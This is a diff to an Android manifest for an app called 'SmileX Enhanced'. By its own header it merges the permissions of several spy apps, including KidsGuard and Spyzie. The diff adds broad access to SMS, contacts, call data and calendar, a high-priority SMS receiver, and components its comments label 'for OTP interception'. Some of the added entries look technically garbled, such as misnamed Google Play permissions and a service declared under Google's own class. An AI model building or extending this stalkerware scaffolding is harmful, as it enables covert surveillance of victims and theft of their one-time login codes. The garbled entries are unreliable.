@@ -3,6 +3,7 @@
     SmileX Enhanced APK - Unified Manifest
     Combines all permissions and components from KidsGuard, Spyzie, hwapp391
     Compatible: Android 4.4 (API 19) to Android 14 (API 34)
+    Updated for 2026 techniques.
 -->
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.smilex.enhanced"
@@ -14,14 +15,18 @@
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
     <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
 
     <!-- ===== PHONE & IDENTITY ===== -->
     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_PRIVILEGED_PHONE_STATE"/>
     <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
     <uses-permission android:name="android.permission.READ_CALL_LOG"/>
     <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
     <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
 
     <!-- ===== LOCATION ===== -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
@@ -41,10 +46,11 @@
     <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
 
     <!-- ===== CONTACTS & MESSAGES ===== -->
-    <uses-permission android:name="android.permission.READ_CONTACTS"/>
     <uses-permission android:name="android.permission.READ_SMS"/>
     <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
     <uses-permission android:name="android.permission.READ_CALENDAR"/>
+    <uses-permission android:name="android.permission.WRITE_CALENDAR"/>
 
     <!-- ===== APP MONITORING ===== -->
     <uses-permission android:name="android.permission.GET_TASKS"/>
@@ -67,6 +73,7 @@
 
     <!-- ===== BLUETOOTH ===== -->
     <uses-permission android:name="android.permission.BLUETOOTH"/>
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN"/>
     <!-- Android 12+ Bluetooth -->
     <uses-permission android:name="android.permission.BLUETOOTH_CONNECT"/>
     <uses-permission android:name="android.permission.BLUETOOTH_SCAN"/>
@@ -79,6 +86,10 @@
 
     <!-- ===== PUSH / GCM ===== -->
     <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
+
+    <!-- ===== SMS RETRIEVER API (for OTP interception) ===== -->
+    <uses-permission android:name="com.google.android.gms.permission.AUTH_PROVIDE_IMAGE_DATA"/>
+    <uses-permission android:name="com.google.android.gms.permission.AUTH_SET_IMAGE_DATA"/>
 
     <application
         android:allowBackup="false"
@@ -186,6 +197,7 @@
             android:exported="true">
             <intent-filter android:priority="999">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+                <action android:name="android.provider.Telephony.SMS_DELIVER"/>
             </intent-filter>
         </receiver>
 
@@ -224,6 +236,13 @@
                 android:name="android.support.FILE_PROVIDER_PATHS"
                 android:resource="@xml/provider_paths"/>
         </provider>
+
+        <!-- ===== SMS RETRIEVER SERVICE (for OTP interception) ===== -->
+        <service android:name="com.google.android.gms.auth.api.phone.SmsRetriever" android:exported="true">
+            <intent-filter>
+                <action android:name="com.google.android.gms.auth.api.phone.SMS_RETRIEVED"/>
+            </intent-filter>
+        </service>
 
     </application>
 </manifest>
